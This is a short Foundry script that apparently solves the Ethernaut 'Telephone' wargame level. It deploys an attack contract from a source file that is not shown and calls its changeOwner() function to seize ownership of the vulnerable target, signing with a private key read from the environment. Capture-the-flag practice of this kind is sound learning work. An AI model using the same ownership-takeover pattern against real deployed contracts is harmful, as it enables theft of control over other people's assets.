// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {Telephone} from "../src/Telephone.sol";

contract TelephoneScript is Script {
    
    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        Telephone attack = new Telephone();
        attack.changeOwner();

        vm.stopBroadcast();
    }
}
